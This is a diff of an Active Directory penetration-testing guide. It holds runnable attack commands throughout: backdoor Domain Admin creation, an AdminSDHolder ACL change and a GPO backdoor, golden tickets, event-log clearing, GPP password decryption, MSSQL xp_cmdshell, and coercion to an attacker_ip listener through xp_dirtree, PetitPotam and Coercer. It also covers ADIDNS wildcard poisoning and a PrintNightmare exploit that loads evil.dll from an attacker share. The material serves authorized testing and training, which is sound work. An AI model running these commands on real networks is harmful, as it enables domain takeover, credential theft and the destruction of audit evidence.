-  ```bash
-  dcomexec.py corp\jsmith:Password123@10.0.0.20
-  ```
+**GPP Passwords (legacy — fixed in MS14-025 but old GPOs may remain):**
 
-### Step-by-Step Guide  
+```
+# Search SYSVOL for cpassword
+findstr /S /I cpassword \\corp.local\sysvol\corp.local\policies\*.xml
 
-#### Scenario A: SMB Share Movement  
-- Enumerate shares:  
-  ```powershell
-  net view \\WS002.corp.local
-  ```
-- Map share:  
-  ```powershell
-  net use Z: \\WS002.corp.local\C$ /user:corp\jsmith Password123
-  ```
+# Decrypt with gpp-decrypt
+gpp-decrypt <encrypted_string>
+```
 
-#### Scenario B: WMI Service Enumeration  
+### 8. LDAP Signing & Channel Binding Status
+
+Critical for determining if relay attacks work.
+
+```
+# Check with NetExec
+nxc ldap dc1.corp.local -u user1 -p 'Pass123' -M ldap-checker
+```
+
+Output shows whether LDAP signing is enforced and channel binding is required.
+
+### 9. Security Controls Check
+
 ```powershell
-Get-WmiObject -Class Win32_Service -ComputerName WS002.corp.local | Where { $_.StartName -like "corp\svc_*" } | Select Name,StartName
+# Check if Windows Defender is running
+Get-MpComputerStatus | Select RealTimeProtectionEnabled, AMServiceEnabled
+
+# Check AppLocker policies
+Get-AppLockerPolicy -Effective | Select -ExpandProperty RuleCollections
+
+# Check Credential Guard
+Get-CimInstance -ClassName Win32_DeviceGuard -Namespace root\Microsoft\Windows\DeviceGuard
+
+# Check AMSI status
+[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils')
 ```
 
-#### Scenario C: Scheduled Tasks  
-```powershell
-Invoke-Command -ComputerName WS002.corp.local -ScriptBlock {
-  Get-ScheduledTask | Where { $_.Principal.UserId -like "corp\*" } | Select TaskName,Principal.UserId
-}
+### 10. MSSQL Server Attacks
+
+MSSQL servers in AD environments often run as domain service accounts with high privileges. Compromising MSSQL can lead directly to domain compromise.
+
+**Discovery:**
+
+```
+# Find MSSQL servers via SPN
+nxc mssql 10.0.0.0/24
+impacket-GetUserSPNs -dc-ip dc1.corp.local corp.local/user1:'Pass123' | grep MSSQL
+
+# LDAP
+ldapsearch -x -H ldap://DC01.corp.local -b "DC=corp,DC=local" \
+  "(&(objectCategory=person)(servicePrincipalName=MSSQL*))" sAMAccountName servicePrincipalName
 ```
 
-### Common Pitfalls  
-- SMB blocked by firewall.  
-- Lacking local admin even with domain creds.  
-- DCOM disabled.
+**Authentication:**
 
-### Next Steps  
-- **Module 11**: Persistence & Cleanup  
+```
+# Password auth
+nxc mssql sql-srv.corp.local -u user1 -p 'Pass123' -d corp.local
 
----
+# SA local auth
+nxc mssql sql-srv.corp.local -u sa -p 'DbP@ss!' --local-auth
 
-## <a name="module-17"></a> Module 17: Persistence & Cleanup
-
-### Introduction  
-After achieving DA, establish persistence and clean up evidence.
-
-### Definitions  
-1. **SIDHistory**: Maintains old SIDs after migration—can be abused.  
-2. **Golden Ticket**: Forged TGT enabling persistent KDC authentication.  
-3. **Silver Ticket**: Forged service ticket.  
-4. **GPO Backdoor**: Malicious GPO linked to maintain persistence.  
-5. **Event Log Manipulation**: Clearing Windows logs to cover tracks.
-
-### Why It Matters  
-- Persistence ensures access; cleanup reduces detection.
-
-### Tools & Commands  
-
-#### Backdoor DA Account  
-```powershell
-New-ADUser -Name "svc_persistence" -SamAccountName "svc_persistence" -AccountPassword (ConvertTo-SecureString "P3rs1st!" -AsPlainText -Force) -Enabled $true -Path "CN=Users,DC=corp,DC=local"
-Add-ADGroupMember -Identity "Domain Admins" -Members "svc_persistence"
+# Impacket
+impacket-mssqlclient corp.local/user1:'Pass123'@sql-srv.corp.local -windows-auth
 ```
 
-#### Protect with AdminSDHolder  
-```powershell
-$sdhPath = "AD:CN=AdminSDHolder,CN=System,DC=corp,DC=local"
-$acl = Get-Acl $sdhPath
-$rule = New-Object System.DirectoryServices.ActiveDirectoryAccessRule("corp\svc_persistence","GenericAll","Allow")
-$acl.AddAccessRule($rule)
-Set-Acl -AclObject $acl $sdhPath
+**Command execution via xp_cmdshell:**
+
+```
+# Enable and execute (requires sysadmin role)
+EXEC sp_configure 'show advanced options', 1; RECONFIGURE;
+EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE;
+EXEC xp_cmdshell 'whoami';
+
+# Or via nxc (handles enable/disable automatically)
+nxc mssql sql-srv.corp.local -u sa -p 'DbP@ss!' --local-auth -x "whoami"
 ```
 
-#### GPO Backdoor  
-```powershell
-New-GPO -Name "Corp-Backdoor" -Comment "Backdoor GPO"
-Set-GPRegistryValue -Name "Corp-Backdoor" -Key "HKLM:\Software\Microsoft\Windows\CurrentVersion\Group Policy\Scripts\Logon\0\0" -ValueName "Script" -Type String -Value "powershell -Command `"Add-LocalGroupMember -Group 'Administrators' -Member 'corp\svc_persistence'`"
-New-GPLink -Name "Corp-Backdoor" -Target "DC=corp,DC=corp,DC=local" -Enforced Yes
+**NTLM coercion via xp_dirtree (force MSSQL service account to authenticate to you):**
+
+```
+# On MSSQL
+EXEC master..xp_dirtree '\\attacker_ip\share\test';
+
+# Capture with Responder or relay with ntlmrelayx
+responder -I eth0 -v
 ```
 
-#### Golden Ticket  
-```powershell
-Mimikatz.exe 'kerberos::golden /user:Administrator /domain:corp.local /sid:S-1-5-21-... /krbtgt:HASH /id:500 /groups:512 /ptt'
+**Linked Servers (pivot across MSSQL instances, even cross-forest):**
+
+```
+# Enumerate linked servers
+SELECT * FROM sys.servers WHERE is_linked = 1;
+
+# Execute on linked server
+EXEC ('xp_cmdshell ''whoami'';') AT [LINKED-SRV];
+
+# Crawl all linked servers (PowerUpSQL)
+Get-SQLServerLinkCrawl -Instance sql-srv.corp.local -Verbose
 ```
 
-#### Cleanup  
-- **Clear Event Logs**:  
-  ```powershell
-  Invoke-Command -ComputerName DC01.corp.local -ScriptBlock {
-    wevtutil cl Security
-    wevtutil cl System
-    wevtutil cl Application
-  }
-  ```  
-- **Remove Backdoor Account**:  
-  ```powershell
-  Remove-ADGroupMember -Identity "Domain Admins" -Members "svc_persistence" -Confirm:$false
-  Remove-ADUser -Identity "svc_persistence"
-  ```  
-- **Revert AdminSDHolder ACL**:  
-  ```powershell
-  $sdhPath = "AD:CN=AdminSDHolder,CN=System,DC=corp,DC=local"
-  $acl = Get-Acl $sdhPath
-  $ace = $acl.Access | Where-Object { $_.IdentityReference -eq "corp\svc_persistence" }
-  $acl.RemoveAccessRule($ace)
-  Set-Acl -AclObject $acl $sdhPath
-  ```  
-- **Remove GPO**:  
-  ```powershell
-  Remove-GPO -Name "Corp-Backdoor" -Confirm:$false
-  ```
+**Impersonation (escalate within MSSQL):**
 
-### Common Pitfalls  
-- Deleting your own rights prematurely.  
-- Clearing only partial logs.  
-- Leaving GPO links dangling.
+```
+# Find impersonatable logins
+SELECT distinct b.name FROM sys.server_permissions a
+  INNER JOIN sys.server_principals b ON a.grantor_principal_id = b.principal_id
+  WHERE a.permission_name = 'IMPERSONATE';
 
----
+# Impersonate
+EXECUTE AS LOGIN = 'sa';
+EXEC xp_cmdshell 'whoami';
+```
+
+### 11. Pre-Created / Pre-2K Computer Accounts
+
+Computer accounts created before Windows 2000 (or with "Assign this computer account as a pre-Windows 2000 computer" checked) have a default password that is the lowercase hostname (without the `$`).
+
+```
+# Find pre-2K accounts via nxc
+nxc ldap dc1.corp.local -u user1 -p 'Pass123' -M pre2k
+
+# Authenticate as the machine account
+nxc smb dc1.corp.local -u 'OLDPC$' -p 'oldpc'
+```
+
+If successful, you have a machine account — use it for RBCD attacks or S4U delegation.
+
+### 12. ADIDNS Poisoning
+
+AD-Integrated DNS allows any authenticated user to create new DNS records. Inject records pointing to your IP to intercept traffic.
+
+```
+# Using dnstool.py (Krbrelayx)
+python3 dnstool.py -u 'corp.local\user1' -p 'Pass123' -a add \
+  -r 'evilhost.corp.local' -d attacker_ip dc1.corp.local
+
+# Using Invoke-DNSUpdate (PowerShell)
+Invoke-DNSUpdate -DNSType A -DNSName evilhost.corp.local -DNSData attacker_ip
+```
+
+Creates a DNS record for `evilhost.corp.local` → your IP. Combine with Responder for credential capture when clients resolve this name.
+
+**Wildcard record (catch all failed DNS lookups):**
+
+```
+python3 dnstool.py -u 'corp.local\user1' -p 'Pass123' -a add \
+  -r '*.corp.local' -d attacker_ip dc1.corp.local
+```
+
+### 13. WebDAV / WebClient Coercion
+
+When the WebClient service is running on a target, you can coerce HTTP-based NTLM authentication (instead of SMB). This bypasses SMB signing requirements since the auth goes over HTTP.
+
+**Check for WebClient service:**
+
+```
+nxc smb 10.0.0.0/24 -u user1 -p 'Pass123' -M webdav
+```
+
+**Coerce via WebDAV (requires WebClient running on target):**
+
+```
+# PetitPotam over HTTP (bypasses SMB signing)
+python3 PetitPotam.py -u user1 -p 'Pass123' -d corp.local attacker@80/test target_ip
+
+# Use SearchConnector or .url/.lnk files in writable shares to trigger WebClient
+```
+
+Key insight: WebDAV coercion sends auth over HTTP → you can relay it to LDAP (for RBCD or shadow credentials) even when SMB signing is enforced.
+
+### 14. Coercer (All-in-One Coercion Tool)
+
+Instead of running PetitPotam, PrinterBug, DFSCoerce, and ShadowCoerce separately, use Coercer to try all methods:
+
+```
+# Try all coercion methods
+python3 Coercer.py coerce -u user1 -p 'Pass123' -d corp.local \
+  --target-ip dc1.corp.local --listener-ip attacker_ip
+
+# List available methods
+python3 Coercer.py scan -u user1 -p 'Pass123' -d corp.local --target-ip dc1.corp.local
+
+# Specific method
+python3 Coercer.py coerce -u user1 -p 'Pass123' -d corp.local \
+  --target-ip dc1.corp.local --listener-ip attacker_ip --filter-method-name PetitPotam
+```
+
+### 15. PrintNightmare (CVE-2021-1675 / CVE-2021-34527)
+
+Remote code execution via the Print Spooler service. Allows any authenticated user to execute code as SYSTEM on targets with Print Spooler running.
+
+```
+# Check if vulnerable
+rpcdump.py @dc1.corp.local | grep -i spoolsv
+
+# Exploit (DLL must be hosted on attacker SMB share)
+python3 CVE-2021-1675.py corp.local/user1:'Pass123'@dc1.corp.local '\\attacker_ip\share\evil.dll'
+```
+
+**Status:** Patched July 2021. Still commonly found unpatched on internal networks. Check for MS patches KB5004945, KB5004947.
+
+### 16. SCCM / MECM (Microsoft Endpoint Configuration Manager)
+
+SCCM/MECM manages software deployment across the domain. Misconfigurations grant paths to domain compromise.
+
+**Discovery:**
+
+```
+# Find SCCM servers via SPN
+ldapsearch -x -H ldap://DC01.corp.local -b "DC=corp,DC=local" \
+  "(servicePrincipalName=*SMS*)" sAMAccountName servicePrincipalName
+
+# Find SCCM via DNS
+nslookup -type=SRV _mssms_mp._tcp.corp.local
+```
+
+**SharpSCCM (enumeration and exploitation):**
+
+```
+# Enumerate SCCM site info
+SharpSCCM.exe local site-info
+
+# Get SCCM credentials (NAA — Network Access Account)
+SharpSCCM.exe local secrets -m wmi
+
+# Execute on SCCM clients (if admin on SCCM)
+SharpSCCM.exe exec -d TargetPC -p "C:\Windows\System32\cmd.exe" -r "/c whoami > C:\temp\out.txt"
+```
+
+**sccmhunter (Python — remote enumeration):**
+
+```
+python3 sccmhunter.py smb -u user1 -p 'Pass123' -d corp.local -dc-ip 10.0.0.1 -target sccm-srv.corp.local
+```
+
+Common SCCM attack paths: extract Network Access Account credentials, abuse client push installation (NTLM relay), deploy malicious applications to targets.
+
+## Module 15: Testing Checklist
+
+### Reconnaissance & Enumeration
+- [ ] Anonymous LDAP bind test
+- [ ] Null session SMB enumeration (shares, users, RID brute)
+- [ ] enum4linux-ng scan
+- [ ] Domain/forest/DC enumeration
+- [ ] Full user enumeration (adminCount, UAC flags, descriptions)
+- [ ] Group enumeration (Domain Admins, Enterprise Admins, built-in groups)
+- [ ] Recursive group membership mapping
+- [ ] Service account (SPN) enumeration
+- [ ] AS-REP roastable account enumeration
+- [ ] Computer enumeration (OS versions, delegation flags)
+- [ ] GMSA enumeration and password extraction
+- [ ] LAPS enumeration and password retrieval
+- [ ] Trust relationship mapping
+- [ ] BloodHound/SharpHound data collection and analysis (or nxc --bloodhound)
+- [ ] ACL enumeration (shadow admin paths, nxc -M daclread)
+- [ ] GPO review for misconfigurations
+- [ ] AD CS enumeration (Certipy find -vulnerable, nxc -M adcs)
+- [ ] MachineAccountQuota check (nxc -M maq)
+- [ ] LDAP signing and channel binding status (nxc -M ldap-checker)
+- [ ] SMB signing status across network (nxc --gen-relay-list)
+- [ ] Stale computer accounts (90+ days inactive)
+- [ ] Pre-2K computer accounts (nxc -M pre2k)
+- [ ] Password policy and FGPP review
+- [ ] WebClient service detection (nxc -M webdav)
+- [ ] Share spidering for sensitive files (nxc -M spider_plus)
+- [ ] MSSQL server discovery and enumeration
+- [ ] SCCM/MECM discovery and enumeration
+- [ ] ADIDNS record enumeration
+
+### Credential Attacks
+- [ ] LLMNR/NBT-NS poisoning (Responder/Inveigh)
+- [ ] ADIDNS poisoning (wildcard record injection)
+- [ ] Password spraying (below lockout threshold, nxc ldap/smb/kerberos)
+- [ ] Kerberoasting (nxc --kerberoasting or Impacket/Rubeus)
+- [ ] AS-REP Roasting (nxc --asreproast or Impacket/Rubeus)
+- [ ] GPP password extraction (nxc -M gpp_password)
+- [ ] LSASS credential extraction (nxc -M lsassy / nanodump)
+- [ ] SAM/LSA dump (nxc --sam --lsa)
+- [ ] NTDS.dit dump (nxc --ntds or secretsdump)
+- [ ] DPAPI credential extraction (nxc --dpapi)
+- [ ] Cached domain credential extraction
+- [ ] Pre-2K computer account default password test
+
+### NTLM Coercion & Relay
+- [ ] PetitPotam coercion test
+- [ ] PrinterBug / SpoolSample coercion test
+- [ ] DFSCoerce test
+- [ ] ShadowCoerce test
+- [ ] WebDAV / HTTP coercion (bypasses SMB signing)
+- [ ] MSSQL coercion via xp_dirtree
+- [ ] Coercer (all-in-one — tries all methods)
+- [ ] NTLM relay to SMB (signing disabled targets)
+- [ ] NTLM relay to LDAP (signing not enforced)
+- [ ] NTLM relay to AD CS web enrollment (ESC8)
+- [ ] NTLM relay to AD CS RPC enrollment (ESC11)
+- [ ] NTLM relay to LDAP + RBCD chain
+- [ ] NTLM relay to LDAP + Shadow Credentials chain
+
+### Kerberos Attacks
+- [ ] Golden Ticket (if krbtgt hash obtained)
+- [ ] Silver Ticket (if service account hash obtained)
+- [ ] Diamond Ticket
+- [ ] Pass-the-Ticket
+- [ ] Over-Pass-the-Hash
+- [ ] S4U abuse (constrained delegation)
+
+### Delegation Attacks
+- [ ] Unconstrained delegation exploitation
+- [ ] Constrained delegation S4U abuse
+- [ ] RBCD attack (MachineAccountQuota + write access)
+- [ ] Printer Bug + unconstrained delegation chain
+
+### AD CS Attacks
+- [ ] ESC1 — Enrollee supplies subject
+- [ ] ESC4 — Template ACL misconfiguration
+- [ ] ESC6 — EDITF_ATTRIBUTESUBJECTALTNAME2
+- [ ] ESC7 — ManageCA / ManageCertificates abuse
+- [ ] ESC8 — Relay to HTTP enrollment
+- [ ] ESC11 — Relay to RPC enrollment
+- [ ] ESC13 — OID group link
+- [ ] Certificate-based persistence
+- [ ] UnPAC-the-Hash
+
+### ACL & Replication Abuse
+- [ ] GenericAll / GenericWrite / WriteDacl abuse
+- [ ] ForceChangePassword abuse
+- [ ] Shadow Credentials (Whisker/pyWhisker)
+- [ ] DCSync
+- [ ] AdminSDHolder backdoor test
+- [ ] DCShadow (if in-scope)
+
+### Lateral Movement
+- [ ] Pass-the-Hash
+- [ ] WinRM / PSRemoting
+- [ ] PSExec / SMBExec / WMIExec
+- [ ] DCOM execution
+- [ ] SMB share enumeration and access
+
+### Trust Attacks
+- [ ] Child → Parent Golden Ticket with EA SID
+- [ ] Cross-forest Kerberoasting
+- [ ] SID filtering verification
+- [ ] Cross-trust resource enumeration
+
+### Privilege Escalation
+- [ ] Token impersonation (SeImpersonatePrivilege)
+- [ ] DnsAdmins DLL loading
+- [ ] Backup Operators abuse
+- [ ] noPac / sAMAccountName spoofing (if unpatched)
+- [ ] Certifried (if unpatched)
+- [ ] PrintNightmare (CVE-2021-1675 / CVE-2021-34527 — if unpatched)
+- [ ] PrintSpoofer / GodPotato (service account → SYSTEM)
+- [ ] MSSQL xp_cmdshell (if sysadmin)
+- [ ] MSSQL linked server crawling
+- [ ] MSSQL impersonation (EXECUTE AS LOGIN)
+- [ ] SCCM credential extraction (NAA secrets)
+- [ ] SCCM client push abuse
+
+### Persistence (Document for Report — Clean Up After)
+- [ ] Golden/Silver/Diamond Ticket
+- [ ] Certificate-based persistence
+- [ ] Shadow Credentials
+- [ ] AdminSDHolder ACE
+- [ ] SID History injection
+- [ ] GPO backdoor
+
+## References & Resources
+
+### Frameworks & Standards
+- OWASP Thick Client Application Security Verification Standard (TASVS v1.8): https://owasp.org/www-project-thick-client-application-security-verification-standard/
+- MITRE ATT&CK — Active Directory: https://attack.mitre.org/techniques/T1087/002/
+
+### Core Tools
+- **Impacket**: https://github.com/fortra/impacket — Python AD attack toolkit (secretsdump, GetUserSPNs, ntlmrelayx, etc.)
+- **NetExec (nxc)**: https://github.com/Pennyw0rth/NetExec — Successor to CrackMapExec. Network service exploitation.
+- **Certipy**: https://github.com/ly4k/Certipy — AD CS enumeration and exploitation (ESC1-ESC16).
+- **Rubeus**: https://github.com/GhostPack/Rubeus — C# Kerberos abuse toolkit.
+- **Mimikatz**: https://github.com/gentilkiwi/mimikatz — Credential extraction and Kerberos manipulation.
+- **BloodHound CE**: https://github.com/SpecterOps/BloodHound — AD attack path visualization.
+- **SharpHound**: https://github.com/BloodHoundAD/SharpHound — BloodHound data collector.
+- **PowerView**: https://github.com/PowerShellMafia/PowerSploit/blob/dev/Recon/PowerView.ps1 — PowerShell AD enumeration.
+- **Whisker**: https://github.com/eladshamir/Whisker — Shadow Credentials (C#).
+- **pyWhisker**: https://github.com/ShutdownRepo/pywhisker — Shadow Credentials (Python).
+- **Responder**: https://github.com/lgandx/Responder — LLMNR/NBT-NS/mDNS poisoner.
+- **Kerbrute**: https://github.com/ropnop/kerbrute — Kerberos username enumeration and password spraying.
+- **PKINITtools**: https://github.com/dirkjanm/PKINITtools — PKINIT exploitation tools.
+- **Certify 2.0**: https://github.com/GhostPack/Certify — C# AD CS enumeration.
+
+### Coercion Tools
+- **PetitPotam**: https://github.com/topotam/PetitPotam
+- **PrinterBug / SpoolSample**: https://github.com/leechristensen/SpoolSample
+- **DFSCoerce**: https://github.com/Wh04m1001/DFSCoerce
+- **ShadowCoerce**: https://github.com/ShutdownRepo/ShadowCoerce
+- **Coercer** (all-in-one): https://github.com/p0dalirius/Coercer
+
+### MSSQL & SCCM Tools
+- **PowerUpSQL**: https://github.com/NetSPI/PowerUpSQL — MSSQL discovery, enumeration, and exploitation.
+- **Impacket mssqlclient**: Part of Impacket — MSSQL interactive client.
+- **SharpSCCM**: https://github.com/Mayyhem/SharpSCCM — SCCM enumeration and exploitation.
+- **sccmhunter**: https://github.com/garrettfoster13/sccmhunter — SCCM attack toolkit.
+
+### Additional Tools
+- **enum4linux-ng**: https://github.com/cddmp/enum4linux-ng — SMB/RPC enumeration.
+- **Inveigh**: https://github.com/Kevin-Robertson/Inveigh — Windows LLMNR/NBNS/mDNS poisoner.
+- **dnstool.py** (Krbrelayx): https://github.com/dirkjanm/krbrelayx — ADIDNS manipulation.
+- **DomainPasswordSpray**: https://github.com/dafthack/DomainPasswordSpray — PowerShell password spraying.
+- **gMSADumper**: https://github.com/micahvandeusen/gMSADumper — Extract GMSA passwords.
+- **PrintNightmare PoC**: https://github.com/cube0x0/CVE-2021-1675
+- **noPac PoC**: https://github.com/Ridter/noPac
+- **GodPotato**: https://github.com/BeichenDream/GodPotato — SeImpersonatePrivilege escalation.
+
+### Research & Methodology
+- Certified Pre-Owned (AD CS whitepaper): https://specterops.io/wp-content/uploads/sites/3/2022/06/Certified_Pre-Owned.pdf
+- Shadow Credentials (SpecterOps): https://posts.specterops.io/shadow-credentials-abusing-key-trust-account-mapping-for-takeover-8ee1a53566ab
+- The Hacker Recipes (comprehensive reference): https://www.thehacker.recipes/
+- InternalAllTheThings: https://swisskyrepo.github.io/InternalAllTheThings/
+- HackTricks AD Methodology: https://book.hacktricks.xyz/windows-hardening/active-directory-methodology
+- adsecurity.org (Sean Metcalf): https://adsecurity.org/
+
+### Practice Labs
+- DVAD (Damn Vulnerable Active Directory): https://github.com/WazeHell/vulnerable-AD
+- GOAD (Game of Active Directory): https://github.com/Orange-Cyberdefense/GOAD
+- Vulnerable-AD: https://github.com/safebuffer/vulnerable-AD
